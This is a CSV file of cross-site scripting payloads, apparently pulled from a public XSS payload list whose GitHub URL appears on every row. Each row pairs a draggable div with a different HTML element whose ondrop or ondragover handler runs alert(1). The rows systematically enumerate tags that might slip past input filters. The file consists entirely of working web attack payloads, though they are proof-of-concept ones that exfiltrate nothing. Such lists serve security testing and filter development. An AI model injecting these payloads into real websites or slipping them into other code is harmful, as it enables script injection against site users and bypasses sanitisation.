cve,tag,payload,url
,XSS,"<div draggable=""true"" contenteditable>drag me</div><optgroup ondrop=alert(1) contenteditable>drop here</optgroup>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><option ondragover=alert(1) contenteditable>drop here</option>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><option ondrop=alert(1) contenteditable>drop here</option>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><output ondragover=alert(1) contenteditable>drop here</output>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><output ondrop=alert(1) contenteditable>drop here</output>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><p ondragover=alert(1) contenteditable>drop here</p>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><p ondrop=alert(1) contenteditable>drop here</p>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><param ondragover=alert(1) contenteditable>drop here</param>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><param ondrop=alert(1) contenteditable>drop here</param>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><picture ondragover=alert(1) contenteditable>drop here</picture>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><picture ondrop=alert(1) contenteditable>drop here</picture>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable>drop here</plaintext>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><plaintext ondrop=alert(1) contenteditable>drop here</plaintext>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><pre ondragover=alert(1) contenteditable>drop here</pre>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><progress ondrop=alert(1) contenteditable>drop here</progress>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><q ondragover=alert(1) contenteditable>drop here</q>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><q ondrop=alert(1) contenteditable>drop here</q>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><rb ondragover=alert(1) contenteditable>drop here</rb>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><rb ondrop=alert(1) contenteditable>drop here</rb>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><rp ondragover=alert(1) contenteditable>drop here</rp>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><rp ondrop=alert(1) contenteditable>drop here</rp>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><rt ondragover=alert(1) contenteditable>drop here</rt>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><rt ondrop=alert(1) contenteditable>drop here</rt>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable>drop here</rtc>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><rtc ondrop=alert(1) contenteditable>drop here</rtc>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><ruby ondragover=alert(1) contenteditable>drop here</ruby>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><ruby ondrop=alert(1) contenteditable>drop here</ruby>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><s ondragover=alert(1) contenteditable>drop here</s>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><s ondrop=alert(1) contenteditable>drop here</s>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><samp ondragover=alert(1) contenteditable>drop here</samp>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><samp ondrop=alert(1) contenteditable>drop here</samp>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><script ondragover=alert(1) contenteditable>drop here</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><script ondrop=alert(1) contenteditable>drop here</script>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><section ondragover=alert(1) contenteditable>drop here</section>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><section ondrop=alert(1) contenteditable>drop here</section>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><select ondrop=alert(1) contenteditable>drop here</select>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><shadow ondragover=alert(1) contenteditable>drop here</shadow>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><shadow ondrop=alert(1) contenteditable>drop here</shadow>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><slot ondragover=alert(1) contenteditable>drop here</slot>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><slot ondrop=alert(1) contenteditable>drop here</slot>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><small ondragover=alert(1) contenteditable>drop here</small>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><small ondrop=alert(1) contenteditable>drop here</small>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><source ondragover=alert(1) contenteditable>drop here</source>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><source ondrop=alert(1) contenteditable>drop here</source>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><spacer ondragover=alert(1) contenteditable>drop here</spacer>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><spacer ondrop=alert(1) contenteditable>drop here</spacer>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><span ondragover=alert(1) contenteditable>drop here</span>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><span ondrop=alert(1) contenteditable>drop here</span>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><strike ondragover=alert(1) contenteditable>drop here</strike>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><strike ondrop=alert(1) contenteditable>drop here</strike>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><strong ondragover=alert(1) contenteditable>drop here</strong>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><strong ondrop=alert(1) contenteditable>drop here</strong>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><style ondragover=alert(1) contenteditable>drop here</style>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><style ondrop=alert(1) contenteditable>drop here</style>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><sub ondragover=alert(1) contenteditable>drop here</sub>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><sub ondrop=alert(1) contenteditable>drop here</sub>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><summary ondragover=alert(1) contenteditable>drop here</summary>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable>drop here</summary>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><sup ondragover=alert(1) contenteditable>drop here</sup>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><sup ondrop=alert(1) contenteditable>drop here</sup>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><svg ondragover=alert(1) contenteditable>drop here</svg>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><svg ondrop=alert(1) contenteditable>drop here</svg>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><table ondragover=alert(1) contenteditable>drop here</table>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><table ondrop=alert(1) contenteditable>drop here</table>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><tbody ondragover=alert(1) contenteditable>drop here</tbody>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><tbody ondrop=alert(1) contenteditable>drop here</tbody>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><td ondragover=alert(1) contenteditable>drop here</td>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><td ondrop=alert(1) contenteditable>drop here</td>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><template ondragover=alert(1) contenteditable>drop here</template>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><template ondrop=alert(1) contenteditable>drop here</template>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<div draggable=""true"" contenteditable>drag me</div><textarea ondragover=alert(1) contenteditable>drop here</textarea>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
